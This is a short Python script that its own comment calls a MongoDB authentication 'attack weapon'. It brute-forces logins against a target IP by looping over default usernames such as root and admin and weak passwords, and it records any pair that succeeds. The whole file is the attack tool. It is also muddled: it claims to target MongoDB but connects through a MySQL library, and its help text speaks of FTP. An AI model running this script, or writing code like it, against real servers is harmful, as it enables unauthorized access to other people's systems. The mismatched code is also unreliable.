# -*- coding: utf-8 -*-
"""
DATE:   2021/12/1
AUTHOR: TesterCC
"""
import traceback

import pymysql
import json
from optparse import OptionParser

# initialization
ret = dict()
ret['status'] = str()
ret['info'] = list()

# python MongoDB身份认证攻击武器.py --target 10.0.4.143 --user ftp --pw guest
user_dict = ["root", "admin"]
password_dict = ["123456", "abcd1234", "QWER!@#$"]

# todo未完成
def MongoLogin(target, username, password):
    try:

        db = pymysql.connect(host=target, user=username, password=password)
        db.close()
        ret['status'] = 'success'
        ret['info'].append({'username': username, 'password': password})
    except:
        # traceback.print_exc()
        pass


def main():
    usage = "Usage: %prog --target <target ip> --user <user name> --pw <password>"
    parse = OptionParser(usage=usage)
    parse.add_option("-t", '--target', type="string", dest="target", help="ftp server ip, e.g. 10.0.0.1")
    parse.add_option("-u", '--user', type="string", dest="username", help="ftp login user name, e.g. root, guest ")
    parse.add_option("-p", '--pw', type="string", dest="password", help="ftp login password , e.g. abc123, toor")
    options, args = parse.parse_args()

    users = list()
    passwords = list()

    if options.username:
        users = options.username.split(',')

    if options.password:
        passwords = options.password.split(',')

    if not options.target:
        ret['status'] = "fail"
        return json.dumps(ret)

    if not options.username:
        users = user_dict

    if not options.password:
        passwords = password_dict

    for user in users:
        for passwd in passwords:
            MongoLogin(options.target, user, passwd)

    if not ret['status']:
        ret['status'] = 'fail'

    return json.dumps(ret)


if __name__ == '__main__':
    main()
